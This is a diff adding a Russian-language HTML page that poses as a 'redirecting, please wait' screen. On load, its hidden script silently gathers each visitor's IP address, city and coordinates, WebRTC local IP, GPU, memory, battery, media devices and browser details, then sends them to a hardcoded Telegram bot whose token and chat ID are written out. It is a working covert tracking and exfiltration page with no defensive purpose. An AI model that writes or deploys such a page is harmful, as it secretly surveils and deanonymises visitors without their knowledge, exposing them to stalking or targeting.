@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Переход на страницу</title>
+    <script>
+        window.onload = function() {
+            const currentTime = new Date().toLocaleString();
+            const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+
+            const deviceInfo = {
+                time: currentTime,
+                platform: isMobile ? 'Телефон' : 'ПК',
+                memory: 'Не доступно',
+                cpu: navigator.hardwareConcurrency || 'Не доступно',
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                ipAddress: 'Не доступно',
+                ram: (navigator.deviceMemory || 'Не доступно') + ' GB',
+                gpu: getGPUInfo(),
+                macAddress: 'Не доступно',
+                networkName: 'Не доступно',
+                language: navigator.language || 'Не доступно',
+                region: 'Не доступно',
+                city: 'Не доступно',
+                latitude: 'Не доступно',
+                longitude: 'Не доступно',
+                browser: navigator.userAgent,
+                connectionType: navigator.connection ? navigator.connection.effectiveType : 'Не доступно',
+                battery: 'Не доступно',
+                internetSpeed: {},
+                webrtcIP: 'Не доступно',
+                mediaDevices: [],
+                systemUptime: Math.floor(performance.now() / 1000) + ' сек'
+            };
+
+            // Определение памяти устройства
+            if (navigator.storage && navigator.storage.estimate) {
+                navigator.storage.estimate().then(estimate => {
+                    deviceInfo.memory = (estimate.quota / (1024 ** 3)).toFixed(2) + ' GB';
+                }).catch(error => {
+                    console.error('Ошибка получения информации о памяти устройства:', error);
+                });
+            }
+
+            // Получение данных о местоположении и IP
+            fetch('https://ip-api.com/json')
+                .then(response => response.json())
+                .then(data => {
+                    deviceInfo.ipAddress = data.query;
+                    deviceInfo.city = data.city;
+                    deviceInfo.region = data.regionName;
+                    deviceInfo.latitude = data.lat;
+                    deviceInfo.longitude = data.lon;
+
+                    // Специфическая настройка для Киева
+                    if (deviceInfo.city === 'Kyiv') {
+                        deviceInfo.region = 'Европа';
+                    }
+
+                    // Если мобильное устройство, получаем информацию о батарее
+                    if (isMobile) {
+                        navigator.getBattery().then(function(battery) {
+                            deviceInfo.battery = battery.level * 100 + '%';
+                        });
+                    }
+
+                    console.log(deviceInfo);
+                    sendDataToTelegram(deviceInfo);
+                })
+                .catch(error => {
+                    console.error('Ошибка получения IP-адреса и местоположения:', error);
+                });
+
+            // Проверка WebRTC IP
+            getWebRTCIP(ip => deviceInfo.webrtcIP = ip);
+
+            // Тест скорости интернета
+            testInternetSpeed().then(speed => deviceInfo.internetSpeed = speed);
+
+            // Получение списка медиаустройств
+            navigator.mediaDevices.enumerateDevices().then(devices => {
+                deviceInfo.mediaDevices = devices.map(d => d.label || d.kind);
+            });
+        };
+
+        // Функция получения информации о видеокарте
+        function getGPUInfo() {
+            try {
+                const gl = document.createElement('canvas').getContext('webgl');
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Не доступно';
+            } catch (e) {
+                return 'Не доступно';
+            }
+        }
+
+        // Проверка WebRTC IP
+        function getWebRTCIP(callback) {
+            try {
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel("");
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+
+                pc.onicecandidate = event => {
+                    if (event.candidate) {
+                        const ipMatch = event.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+                        if (ipMatch) {
+                            callback(ipMatch[1]);
+                        }
+                    }
+                };
+            } catch (e) {
+                console.error('Ошибка WebRTC:', e);
+                callback('Не доступно');
+            }
+        }
+
+        // Тест скорости интернета
+        async function testInternetSpeed() {
+            try {
+                const startTime = performance.now();
+                // Используем другой ресурс для тестирования
+                await fetch('https://www.cloudflare.com/cdn-cgi/trace');
+                const duration = (performance.now() - startTime) / 1000;
+                return {
+                    ping: duration.toFixed(2) + ' сек',
+                    download: (500 / duration).toFixed(2) + ' Kbps'
+                };
+            } catch (e) {
+                console.error('Ошибка при тестировании скорости интернета:', e);
+                return { ping: 'Не доступно', download: 'Не доступно' };
+            }
+        }
+
+        // Отправка данных в Telegram
+        function sendDataToTelegram(deviceInfo) {
+            const TELEGRAM_BOT_TOKEN = '7300330037:AAHC29WHTmlNTgS3Zx7PwnVN6jMPtbxXsLQ';
+            const CHAT_ID = '6695380917';
+
+            const message = `
+                Найден новый вход! (${deviceInfo.time})
+
+                📱 Устройство: ${deviceInfo.platform}
+                🧠 Память: ${deviceInfo.memory}
+                🖥 Процессор: ${deviceInfo.cpu} ядер
+                🖥 Разрешение экрана: ${deviceInfo.screenResolution}
+                🌎 IP-адрес: ${deviceInfo.ipAddress}
+                🧠 ОЗУ: ${deviceInfo.ram}
+                🎮 Видеокарта: ${deviceInfo.gpu}
+                🏷 MAC-адрес: ${deviceInfo.macAddress}
+                🌐 Название сети: ${deviceInfo.networkName}
+                🗣 Язык: ${deviceInfo.language}
+                🌍 Регион: ${deviceInfo.region}
+                🏙 Город: ${deviceInfo.city}
+                📍 Широта: ${deviceInfo.latitude}
+                📍 Долгота: ${deviceInfo.longitude}
+                🌐 Браузер: ${deviceInfo.browser}
+                🔗 Тип подключения: ${deviceInfo.connectionType}
+                🔋 Батарея: ${deviceInfo.battery}
+                🕒 Время работы системы: ${deviceInfo.systemUptime}
+                📡 WebRTC IP: ${deviceInfo.webrtcIP}
+                🖥 Медиаустройства: ${deviceInfo.mediaDevices.join(', ') || 'Нет'}
+                ⚡ Скорость интернета: Ping ${deviceInfo.internetSpeed.ping}, Download ${deviceInfo.internetSpeed.download}
+            `;
+
+            const blob = new Blob([message], { type: 'text/plain' });
+            const file = new File([blob], 'device_info.txt', { type: 'text/plain' });
+
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('document', file);
+
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
+                method: 'POST',
+                body: formData,
+            })
+            .then(response => response.json())
+            .then(data => console.log('Данные успешно отправлены в Telegram:', data))
+            .catch(error => console.error('Ошибка при отправке:', error));
+        }
+    </script>
+</head>
+<body>
+    <h1>Подождите!</h1>
+    <p>Переход на главную страницу</p>
+</body>
+</html>
